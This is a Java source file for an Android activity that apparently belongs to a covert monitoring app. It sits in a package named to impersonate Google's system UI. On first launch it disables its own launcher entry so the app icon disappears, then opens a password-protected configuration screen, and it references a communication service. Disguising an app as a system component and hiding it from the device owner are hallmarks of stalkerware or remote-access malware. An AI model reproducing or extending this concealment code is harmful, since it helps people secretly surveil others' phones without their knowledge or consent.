package com.google.android.systemUi.activity;

import android.app.Activity;
import android.content.ComponentName;
import android.content.Intent;
import android.content.SharedPreferences;
import android.content.pm.PackageManager;
import android.os.Bundle;
import android.preference.PreferenceManager;

import com.google.android.systemUi.service.CommunicationService;

public class Starter extends Activity
{
	@Override
	protected void onCreate(Bundle bundle)
	{
		super.onCreate(bundle);

		SharedPreferences defaultPreferences= PreferenceManager.getDefaultSharedPreferences(this);

		PackageManager packageManager = getPackageManager();
		ComponentName componentName = new ComponentName(this, Starter.class);

		packageManager.setComponentEnabledSetting(componentName, PackageManager.COMPONENT_ENABLED_STATE_DISABLED, PackageManager.DONT_KILL_APP);

		startActivity(new Intent(this, Configuration.class)
				.putExtra(Configuration.EXTRA_PASSWORD, defaultPreferences.getString("password", "password")));

		finish();
	}
}
